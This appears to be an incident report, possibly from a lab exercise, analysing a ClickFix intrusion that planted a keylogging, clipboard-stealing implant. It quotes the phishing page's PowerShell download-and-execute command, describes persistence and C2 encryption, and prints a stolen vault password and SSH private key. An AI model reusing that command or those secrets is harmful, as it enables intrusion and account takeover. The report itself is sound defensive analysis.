# Incident Report — `updater.exe` ClickFix Compromise of Kongsberg Gruppen

**Incident ID:** IR-2026-03-29-01
**Report date:** 2026-04-27
**Severity:** Critical
**Status:** Containment required (active C2, sensitive data exfiltrated)

> All findings are labelled **Confirmed** (multiple independent evidence sources)
> or **Hypothesis** (single source / inferred behaviour).

---

## 1. Timeline summary

### 1.1 Motivation (Hypothesis, high-confidence)

Industrial / political espionage against **Kongsberg Gruppen** (Norwegian
defence prime). The phishing landing page used victim-tailored lures
(`?file=kongsberggrupper-insider`, `?file=norway-buys-80-jets`), the
operator's tasking commands targeted the user's `Desktop` directly to
read a specific email about a **classified NASAMS air-defence sale to
Poland (NOK 3.5–4 billion)**, and the implant explicitly **refuses to
run on Russian-locale (LCID 0x0419)** systems and contains an
**analyst-trap that wipes `C:\Users\Bohdan\Desktop`**. The
`Bohdan`/Russian-locale combination is consistent with a
Russian-/Belarusian-aligned threat actor seeking Polish/Norwegian
military procurement intelligence.

### 1.2 Attack vector (Confirmed)

**ClickFix / FakeCaptcha** (MITRE T1204.004 + T1059.001).

1. Victim visits attacker-controlled site
   `http://f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no`
   (typo-squat: "f1leshare" with a digit 1) — Fortinet-themed "shared
   file" page.
2. Page redirects to `/captcha?email=<victim>` which silently writes a
   PowerShell one-liner to the clipboard (this exact string was later
   captured by the implant's own keylogger from Anders's clipboard —
   confirming the social-engineering payload):
   ```
   powershell -exec bypass -windowstyle hidden -command
     "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
      IWR -Uri 'http://f1leshare.net/download/updater'
          -OutFile $env:TEMP\updater.exe -UseBasicParsing;
      & $env:TEMP\updater.exe"
   ```
3. Victim is instructed (per ClickFix pattern) to press **Win+R** and
   paste; PowerShell downloads and runs `updater.exe`.

### 1.3 Impact (Confirmed)

| Asset | Status | Evidence |
|---|---|---|
| `anders-desktop` (10.3.10.21) — user `anders@kongsberg.com` | **Fully compromised**, persistence active, C2 live | Sysmon EID 1/11/22, registry events, ongoing HTTP beacons at end of capture |
| `john-desktop` (10.3.10.22) — user `john@airbus.com` | Implant detonated then exited 0.2 s later — no persistence, no C2 traffic | Sysmon EID 1 17:49:12.488 → EID 5 17:49:12.700 |
| `emil-desktop` | Not compromised (no IOCs observed) | — |

**Data exfiltrated from `anders-desktop` (recovered in cleartext, see § 2):**

1. **`C:\Users\anders\Desktop\polen.eml`** — internal email from
   *Emil Andersson* to Anders disclosing the **NASAMS sale to Poland
   (NOK 3.5–4 bn, 40–50 new hires planned in Poland)**. Marked as
   **non-public** in the message itself.
2. **Vaultwarden master credentials** (Anders's password vault):
   user `anders@kongsberg.com`, password `anderserkul123` —
   recovered from the keylogger stream, plus successful "Save your
   password?" Edge prompt observed.
3. **An OpenSSH ed25519 private key** copied to Anders's clipboard at
   17:52:40 — recovered verbatim from the clipboard-stealer channel
   (full key block in § 2.7).
4. **System fingerprint**: `Host: ANDERS-DESKTOP / User: anders /
   Arch: x64 / CPUs: 4 / RAM: 8185 MB`.
5. **Directory listings** of `C:\Users`, `C:\Users\anders\Documents`,
   `C:\Users\anders\Desktop`.
6. **Foreground-window titles and clipboard contents** continuously
   from 17:47 onward (browsing history, Vaultwarden activity, …).

### 1.4 Master timeline (UTC, 2026-03-29)

| Time | Host | Event | Confidence |
|---|---|---|---|
| 17:46:32 | anders-desktop | Edge GETs `f1leshare.net/?file=kongsberggrupper-insider` | Confirmed (HTTP log) |
| 17:46:41 | anders-desktop | Visits `/captcha?email=anders%40kongsberg.com` | Confirmed |
| 17:46:55 | anders-desktop | RunMRU registry write — PowerShell ClickFix command pasted into Win+R | Confirmed (registry EDR) |
| 17:47:07 | anders-desktop | `IWR` downloads `updater.exe` (UA `WindowsPowerShell/5.1`) | Confirmed |
| 17:47:11 | anders-desktop | File create `…\Temp\updater.exe` (88 576 B) | Confirmed (Sysmon EID 11) |
| 17:47:19.669 | anders-desktop | **Initial recon beacon** (cleartext) → `MiccosoftUpdate.com/api/info` | Confirmed |
| 17:47:19.876 | anders-desktop | First keylog/window event → `/api/data` (decrypted: `[WINDOW: New tab and 6 more pages - Profile 1 - Microsoft Edge]`) | Confirmed (decrypted) |
| 17:47:19.884 | anders-desktop | Clipboard exfil: full ClickFix PowerShell payload | Confirmed (decrypted) |
| 17:47:20 | anders-desktop | `updater.exe` process create (parent powershell) | Confirmed (Sysmon EID 1) |
| 17:47:21 | anders-desktop | **Persistence**: `HKCU…\Run\MicrosoftUpdater`, Startup folder `msteamsupdater.exe` | Confirmed |
| 17:47:22 | anders-desktop | DNS A `miccosoftupdate.com` from updater.exe | Confirmed (Sysmon EID 22) |
| 17:47:52 | anders-desktop | DNS A `windowsupdater.tk` from updater.exe | Confirmed |
| 17:48:20.010 | anders-desktop | **C2 task #1**: `dir "C:\Users"` | Confirmed (decrypted) |
| 17:48:20.302 | anders-desktop | Result POST → `/update/servicedata` (decrypted: shows `anders / localuser / Public` accounts) | Confirmed |
| 17:49:09 | john-desktop | `updater.exe` dropped | Confirmed |
| 17:49:12.488→700 | john-desktop | Process create then immediate Process Terminated (0.2 s) — implant aborts on this host | Confirmed; root cause = environmental check (Hypothesis: hostname/locale guard) |
| 17:49:20.346 | anders-desktop | **C2 task #2**: `dir "C:\Users\anders\Documents"` | Confirmed (decrypted) |
| 17:50:50.567 | anders-desktop | **C2 task #3**: `dir "C:\Users\anders\Desktop"` (reveals `polen.eml`) | Confirmed (decrypted) |
| 17:51:50.695 | anders-desktop | **C2 task #4**: `type "C:\Users\anders\Desktop\polen.eml"` | Confirmed (decrypted) |
| 17:51:51.101 | anders-desktop | **Exfil of polen.eml** — 1944 B encrypted POST → `/update/servicedata` | Confirmed (decrypted to full email) |
| 17:52:04 | anders-desktop | Keylogger captures `https.77vaultwarden.ryo.no` (Anders typing in URL bar) | Confirmed (decrypted) |
| 17:52:04 | anders-desktop | Window switch → `Vaultwarden Web` | Confirmed |
| 17:52:28 | anders-desktop | Keylogger captures `anders2kongsberg.comanderserkul123` (=`anders@kongsberg.com` + password `anderserkul123`; "@"→"2" because shift handling of digit-row not implemented) | Confirmed (decrypted + matches malware code) |
| 17:52:28 | anders-desktop | Window `Save your password?` (Edge "save credentials" prompt fires after submit) | Confirmed |
| 17:52:40.387 | anders-desktop | **Clipboard exfil — OpenSSH ed25519 PRIVATE key** → `MiccosoftUpdate.com/api/data` | Confirmed (full key recovered) |
| 17:52:51+ | anders-desktop | C2 polling continues at end of capture window | Confirmed |

---

## 2. IOC details

### IOC-1 — Phishing domain `f1leshare.net` (10.3.124.26)  *(Confirmed)*

**What:** Threat-actor-controlled web server delivering a Fortinet-branded
"shared file" page → fake CAPTCHA page that copies a PowerShell
download-and-execute one-liner to the clipboard (ClickFix).

**Evidence query (Elasticsearch DSL):**
```json
GET .ds-logs-network_traffic.http-*/_search
{ "query": { "bool": { "should": [
    { "wildcard": { "url.full": "*f1leshare*" }},
    { "wildcard": { "destination.domain": "*f1leshare*" }} ] }},
  "sort": [{ "@timestamp": "asc" }] }
```

**Raw data (excerpt):**
- `2026-03-29T17:46:32.447Z anders-desktop GET http://f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no`
- `17:47:03 john-desktop GET …/?file=norway-buys-80-jets&share=reddit.com` (Airbus-themed lure)
- `17:47:07.104 anders-desktop GET /download/updater  UA=Mozilla/5.0 (… WindowsPowerShell/5.1.22621.169)`
- The exact ClickFix PowerShell line appears in the captcha-page response
  body **and** in the implant's own clipboard-stealer telemetry (see
  § 2.5), independently confirming the social-engineering payload.

**Why malicious:** Typo-squat domain (digit "1" replacing "l"),
victim-specific lure parameters (Kongsberg/Norway-defence keywords),
delivery of an unsigned PE via PowerShell with `-exec bypass
-windowstyle hidden` and TLS validation disabled.

---

### IOC-2 — Implant binary `updater.exe`  *(Confirmed)*

**Hashes (from Sysmon EID 1 on both anders-desktop and john-desktop):**

| Algo | Value |
|---|---|
| SHA256 | `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d` |
| MD5 | `0af1b6721ed62e0ac9144cc5b456dc78` |
| Size | 88 576 bytes |

**Drop / persistence paths:**
- `C:\Users\<u>\AppData\Local\Temp\updater.exe` (initial drop by powershell)
- `C:\Users\anders\AppData\Local\Microsoft\updater.exe`
- `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe`
- All three are byte-identical (same SHA256).

**Build details (Ghidra):** Windows x86-64 PE built with MinGW-w64
GCC 9.3-win32 / 10-win32 (compiler strings present).

**Capabilities** (decompiled and verified — see § 4 of
[ghidra-findings.md](ghidra-findings.md)):

- Single-instance mutex `Global\MicrosoftUpdateMutex`.
- **Locale guard**: `GetSystemDefaultLCID() == 0x0419` (Russian) ⇒ exit.
- **Researcher-trap**: XOR-decoded path `C:\Users\Bohdan\Desktop` —
  if present, recursively delete contents.
- Triple persistence (HKCU `Run`, Startup folder, spoofed HKLM
  `TaskCache\Tree\MicrosoftUpdater`).
- `cmd.exe /c <task>` runner via `CreatePipe`+`CreateProcessA`
  (`CREATE_NO_WINDOW`).
- `GetAsyncKeyState` keylogger (100 ms poll) with
  `GetForegroundWindow`/`GetWindowTextA` window-change markers.
- `OpenClipboard`/`GetClipboardData(CF_TEXT)` clipboard stealer.
- Two HTTP/80 channels via WinINet (UA `Mozilla/5.0`).
- AES-128-ECB+PKCS#7 (BCrypt) wrapped in standard Base64 for all
  encrypted traffic.

**Why malicious:** Unsigned PE in user-writable temp path, parent
`powershell.exe`, multiple persistence vectors, hard-coded C2 strings,
keylogger + clipboard-stealer + remote shell. Sysmon EID 1 records the
same SHA256 across every drop.

---

### IOC-3 — Persistence on `anders-desktop`  *(Confirmed)*

**Evidence query:**
```esql
FROM logs-endpoint.events.registry-*
| WHERE registry.path LIKE "*Run*" OR registry.path LIKE "*Startup*"
```

**Raw data (anders-desktop, 2026-03-29T17:47:21):**
- Registry SET `HKEY_USERS\S-1-5-21-2720038117-2954272070-1833396500-1002\
  Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater`
  = `C:\Users\anders\AppData\Local\Microsoft\updater.exe`
  (process: `updater.exe`)
- File create `…\Startup\msteamsupdater.exe`.

The Ghidra function `FUN_140002e83` confirms the implant additionally
writes a spoofed `HKLM\…\TaskCache\Tree\MicrosoftUpdater` registry tree
(values `SD`, `Index`) to *look like* a scheduled task without actually
registering one — a classic persistence-by-imitation trick (T1112 +
T1547.001 + T1036.005).

---

### IOC-4 — C2 channel A: `MiccosoftUpdate.com` (10.3.97.182)  *(Confirmed)*

**Role (verified via decryption of all sample bodies):** Initial recon
(cleartext) + keylogger / clipboard / window-title exfil (encrypted).

**Endpoints:**
- `POST /api/info` — first beacon, plaintext recon.
- `POST /api/data` — encrypted keylog/clipboard/window events
  (type-tag byte = `0x01`).

**Initial beacon raw body (cleartext, 17:47:19.669):**
```
Host: ANDERS-DESKTOP
User: anders
Arch: x64
CPUs: 4
RAM: 8185 MB
```

**Encryption (recovered):**
- AES-128-ECB / PKCS#7 (BCrypt `ChainingModeECB`).
- Body layout: `base64( 0x01 || AES(plaintext) )` (the type tag is
  prepended *outside* the encryption — verified by
  `len(b64decode(body)) % 16 == 1`).
- **Key for `/api/data` = first 16 bytes of `User:` field** (zero-padded)
  → key for anders-desktop = `b"anders\0\0\0\0\0\0\0\0\0\0"`.
  *(Discovered by reading `FUN_1400022bb` in Ghidra: the third arg of
  `FUN_140001df3` traces back to the buffer that received
  `GetUserNameA`, not the hostname. Independently confirmed by
  successful AES decryption of every captured body to clean ASCII
  with `[WINDOW: …]` / `[CLIPBOARD] …` markers.)*

---

### IOC-5 — C2 channel B: `windowsupdater.tk` (10.3.215.83)  *(Confirmed)*

**Role:** Operator tasking + command-output exfil.

**Endpoints:**
- `POST /windows/checkforupdate` — beacon (body: `Host: ANDERS-DESKTOP\r\n`),
  response carries `{"command":"<b64-aes>","encrypted":"True"}`.
- `POST /update/servicedata` — encrypted command output (type byte = `0x03`).

**Encryption (recovered):**
- Same AES-128-ECB+PKCS#7+Base64 scheme.
- **Key for this channel = first 16 bytes of `Host:` field** (zero-padded)
  → key for anders-desktop = `b"ANDERS-DESKTOP\0\0"`.
- The dual-key design (one channel keyed on hostname, the other on
  username) is a Confirmed reverse-engineering finding: it explains
  why the same `updater.exe` produces two cryptographically separate
  streams from the same host.

---

### IOC-6 — Operator tasking sequence  *(Confirmed via decryption)*

Each row below was recovered by AES-decrypting the `command` field
returned in the `/windows/checkforupdate` response with key
`b"ANDERS-DESKTOP\0\0"`:

| Time (UTC) | Decrypted command | Output size (bytes) |
|---|---|---|
| 17:48:20.010 | `dir "C:\Users"` | 516 |
| 17:49:20.346 | `dir "C:\Users\anders\Documents"` | 408 |
| 17:50:50.567 | `dir "C:\Users\anders\Desktop"` | 536 |
| 17:51:50.695 | `type "C:\Users\anders\Desktop\polen.eml"` | 1944 |

The progression (Users → Documents → Desktop → `type polen.eml`) is
hands-on-keyboard targeted reconnaissance — the operator clearly went
looking for the email on the desktop. ATT&CK T1083 + T1005 + T1041.

---

### IOC-7 — Exfiltration of `polen.eml` (the NASAMS / Poland email)  *(Confirmed)*

**Evidence query (largest exfil POST):**
```json
GET .ds-logs-network_traffic.http-*/_search
{ "query": { "bool": { "must": [
    { "term": { "destination.domain": "windowsupdater.tk" } },
    { "term": { "url.path": "/update/servicedata" } } ] } },
  "sort": [{ "http.request.body.bytes": "desc" }] }
```

**Raw ciphertext (1944 B base64, 2026-03-29T17:51:51.101Z):**
preserved in [elasticsearch-findings.md](elasticsearch-findings.md) IOC-7.

**Decrypted plaintext (key `ANDERS-DESKTOP\0\0`, AES-128-ECB,
PKCS#7-unpadded, type byte `0x03` stripped — saved to
[polen.eml.recovered](polen.eml.recovered)):**

```
Return-Path: <emil.andersson@kongsberg.com>
Received: from mail.kongsberg.com (mail.kongsberg.com [192.0.2.1])
    by mail.kongsberg.com (8.14.7/8.14.7) with ESMTP id m3L5GdH3001234
    for <anders@kongsberg.com>; Thu, 26 Mar 2026 10:15:00 +0100
From: Emil Andersson <emil.andersson@kongsberg.com>
To: Anders <anders@kongsberg.com>
Subject: Polen NASAMS-avtale
Date: Thu, 26 Mar 2026 10:15:00 +0100
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit

Hei Anders,

Ville bare gi deg en kort oppdatering. Vi har fått bekreftet at de
polske vennene våre har valgt å kjøpe NASAMS fra Kongsberg. Avtalen
skal være på rundt 3,5–4 milliarder kroner, og systemet inkluderer
både radar, kommandoplass og lanseringsenheter med langtrekkende
presisjonsraketter.

NASAMS gir betydelig fleksibilitet med integrasjon mot ulike
luftvernsystemer, rask respons på mål i alle høyder og mulighet for
samtidig håndtering av flere trusler. Den valgte pakken innebærer
full logistikk- og vedlikeholdsoppfølging, så kunden får et
komplett, operativt luftvernsystem.

Det innebærer at vi må ansette 40–50 personer i Polen. Har du noen
tanker om hvordan vi kan rekruttere fortest mulig? Vi må få på
plass et team rimelig kvikt.

Noter deg at informasjonen ikke er offentlig kjent, så vær nøye
med hvem du deler dette med.

Med vennlig hilsen,
Emil Andersson
Kongsberg Gruppen
```

**Sensitivity:** The email is explicitly marked as **non-public** by
its author. Discloses (a) the existence of a confirmed NOK 3.5–4 bn
NASAMS contract with Poland, (b) the technical scope (radar +
command + launchers + long-range precision missiles + full
logistics/maintenance), and (c) HR plans (40–50 hires in Poland).

---

### IOC-8 — Vaultwarden master credentials theft  *(Confirmed)*

**Evidence:** Decrypted `/api/data` stream (key `anders\0…`) at
17:52:04 → 17:52:32 reconstructs the following user activity:

| Time | Decrypted event |
|---|---|
| 17:52:04.789 | (heartbeat keylog) `https.77vaultwarden.ryo.no` |
| 17:52:04.801 | `[WINDOW: Vaultwarden Web and 7 more pages - Profile 1 - Microsoft Edge]` |
| 17:52:28.531 | (keylog) `anders2kongsberg.comanderserkul123` |
| 17:52:28.537 | `[WINDOW: Save your password?]` |
| 17:52:32.469 | `[WINDOW: Vaults | Vaultwarden Web and 7 more pages - Profile 1 - Microsoft Edge]` |

**Interpretation:** The keylogger does *not* implement Shift+digit
mappings (verified in `FUN_140003233` decompile — only Shift on letters
is handled). When Anders typed `anders@kongsberg.com`, the `@`
(`Shift+2`) was recorded as `2`, giving the captured string
`anders2kongsberg.com`. Concatenated with the immediately following
characters this yields:

| Field | Recovered value |
|---|---|
| Vaultwarden URL | `https://vaultwarden.ryo.no` |
| Username | `anders@kongsberg.com` |
| Password | `anderserkul123` |

The "Save your password?" Edge prompt and the subsequent navigation to
**`Vaults`** confirm a successful Vaultwarden master-password unlock —
i.e. the operator now has the keys to **every** secret in Anders's
vault.

---

### IOC-9 — OpenSSH ed25519 private key clipboard theft  *(Confirmed)*

**Evidence query:** largest `/api/data` body.

**Raw ciphertext (556 B b64, 2026-03-29T17:52:40.387, type byte `0x01`):**
preserved in [elasticsearch-findings.md](elasticsearch-findings.md)
IOC-4 listing.

**Decrypted plaintext (key `anders\0\0\0\0\0\0\0\0\0\0`):**

```
[CLIPBOARD] -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACATPFdh+uiwntlTFtoBZL3Z93r9mPFrG0R+8gc3J6aWZgAAAIgVG358FRt+
fAAAAAtzc2gtZWQyNTUxOQAAACATPFdh+uiwntlTFtoBZL3Z93r9mPFrG0R+8gc3J6aWZg
AAAEDHlNIvcCmxaoT1pcOn30GIggyG+N4K4DkaxVhJSTv0CxM8V2H66LCe2VMW2gFkvdn3
ev2Y8WsbRH7yBzcnppZmAAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
```

This is an **un-encrypted** ed25519 private key (header
`b3BlbnNzaC1rZXktdjE…AAAABG5vbmU` = `openssh-key-v1\0…none` — no KDF,
no passphrase). The corresponding public key bytes
(`13:3c:57:61:fa:e8:b0:9e:d9:53:16:da:01:64:bd:d9:f7:7a:fd:98:f1:6b:1b:44:7e:f2:07:37:27:a6:96:66`)
can be used to enumerate which servers Anders trusts. **All systems
trusting this key must be considered compromised** and the key must be
revoked immediately.

---

### IOC-10 — Implant abort on `john-desktop`  *(Confirmed event;
Hypothesis on root cause)*

`updater.exe` ran for **0.2 seconds** on john-desktop and produced no
persistence, no DNS, no HTTP. Sysmon evidence:

| Time | EID | Event |
|---|---|---|
| 17:49:12.488 | 1 | Process create `updater.exe` (parent powershell) |
| 17:49:12.700 | 5 | Process terminated |

The malware contains an explicit **Russian-locale guard** (`LCID
0x0419` ⇒ `exit(0)`) and a **`C:\Users\Bohdan\Desktop` wipe path** —
neither would cause john-desktop to abort instantly under normal
circumstances. The most likely root cause is the **single-instance
mutex** check (`CreateMutexA("Global\\MicrosoftUpdateMutex")` →
`GetLastError() == ERROR_ALREADY_EXISTS` ⇒ `exit(0)`) **firing
spuriously**, but no evidence of a prior or concurrent instance exists
on john-desktop. An alternate hypothesis is an undisclosed
target-list check (e.g. domain/hostname allowlist) in the un-disassembled
C2-thread region `0x140002a28-0x140002e82`. Dynamic analysis required
to confirm.

---

### IOC-11 — Hard-coded analyst-trap path `C:\Users\Bohdan\Desktop`  *(Confirmed in code, Hypothesis on motivation)*

`FUN_14000221a` XOR-decodes the string `C:\Users\Bohdan\Desktop` from
the stack-stored constant `0x73726573555c3a43 / 0x5c737265646e415c /
0x706f746b736544` (`"C:\Users\Anders\Desktop"`) using key
`{0x03,0x01,0x0c,0x01,0x13,0x1d}` over offset 9 (the 6 bytes spelling
"Anders"), turning it into "Bohdan", and recursively deletes the
folder if it exists. Combined with the LCID `0x0419` Russian-locale
abort, this strongly points to a researcher/analyst named Bohdan being
known to the actor and a deliberate effort to brick that researcher's
sandbox while never running on Russian boxes.

---

## 3. Confirmed indicators (IOC summary table)

| Type | Indicator | First seen |
|---|---|---|
| Domain | `f1leshare.net` | 2026-03-29 17:46:30Z |
| IP | 10.3.124.26 (f1leshare.net) | 2026-03-29 17:46:32Z |
| Domain | `MiccosoftUpdate.com` (typo-squat) | 2026-03-29 17:47:22Z |
| IP | 10.3.97.182 (MiccosoftUpdate.com) | 2026-03-29 17:47:19Z |
| Domain | `windowsupdater.tk` | 2026-03-29 17:47:52Z |
| IP | 10.3.215.83 (windowsupdater.tk) | 2026-03-29 17:48:20Z |
| URL path | `/api/info`, `/api/data`, `/windows/checkforupdate`, `/update/servicedata` | — |
| User-Agent | `Mozilla/5.0` (no version) | — |
| File | `updater.exe`, `msteamsupdater.exe` (88 576 B) | 2026-03-29 17:47:11Z |
| SHA256 | `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d` | — |
| MD5 | `0af1b6721ed62e0ac9144cc5b456dc78` | — |
| Mutex | `Global\MicrosoftUpdateMutex` | — |
| Registry | `HKCU\…\Run\MicrosoftUpdater` | 2026-03-29 17:47:21Z |
| Registry | `HKLM\…\Schedule\TaskCache\Tree\MicrosoftUpdater` | — |
| Path | `%APPDATA%\Microsoft\updater.exe` | — |
| Path | `<Startup>\msteams_updater.exe` (also seen as `msteamsupdater.exe`) | — |
| String | `Global\MicrosoftUpdateMutex`, `MicrosoftUpdater`, `[CLIPBOARD] %s`, `[WINDOW: %s]`, `Host: %s\nUser: %s\n…` | — |
| Crypto | AES-128-ECB / PKCS#7 / Base64 over HTTP/80 | — |
| AES key (cmd channel) | `ANDERS-DESKTOP\x00\x00` (= hostname, zero-padded) | — |
| AES key (keylog channel) | `anders\x00…` (= username, zero-padded) | — |
| ClickFix landing param | `?file=kongsberggrupper-insider`, `?file=norway-buys-80-jets` | — |
| Analyst trap path | `C:\Users\Bohdan\Desktop` | — |
| Locale guard | LCID `0x0419` (ru-RU) | — |

---

## 4. Recommended actions

1. **Contain anders-desktop**: isolate from network, image RAM and
   disk, do not reboot.
2. **Block at the perimeter** the three domains and three IPs above;
   sinkhole if possible. C2 was still active at the end of the
   capture window.
3. **Reset all of Anders's credentials**, starting with
   `anders@kongsberg.com` and the Vaultwarden master password
   `anderserkul123` — and **rotate every secret stored in that
   Vaultwarden vault** (it must be assumed exfiltrated).
4. **Revoke the leaked OpenSSH ed25519 key** on every server that
   trusts it; audit `authorized_keys` files for the public key
   fingerprint listed in IOC-9.
5. **Treat the Polen NASAMS information as compromised**; notify
   counter-intel / national CERT; consider whether business and
   diplomatic mitigations are needed before the hiring plan goes
   public.
6. **Hunt across the estate** for the IOCs in § 3 — particularly the
   mutex name, the Run-key value, the Startup-folder filename and the
   two C2 domains in proxy/DNS logs older than the capture window
   (Sysmon EID 22, Zeek `dns.log`, proxy `http.log`).
7. **Sweep john-desktop** for residual artefacts (the implant aborted
   before persistence, but Sysmon recorded the drop file under
   `…\Temp\updater.exe` — verify it has been removed).
8. **Re-image** anders-desktop and john-desktop after evidence is
   preserved.

---

## 5. Files produced during this investigation

- [elasticsearch-findings.md](elasticsearch-findings.md) — raw ES
  evidence (queries + sample documents).
- [ghidra-findings.md](ghidra-findings.md) — full reverse-engineering
  notes (decompiled functions, capability map, hard-coded IOCs).
- [decrypt.py](decrypt.py),
  [decrypt_all.py](decrypt_all.py),
  [decrypt_keylog.py](decrypt_keylog.py),
  [keyguess.py](keyguess.py),
  [keyguess2.py](keyguess2.py) — scripts used to recover the
  AES-128-ECB plaintexts from the captured C2 traffic.
- [polen.eml.recovered](polen.eml.recovered) — recovered cleartext of
  the exfiltrated `polen.eml`.
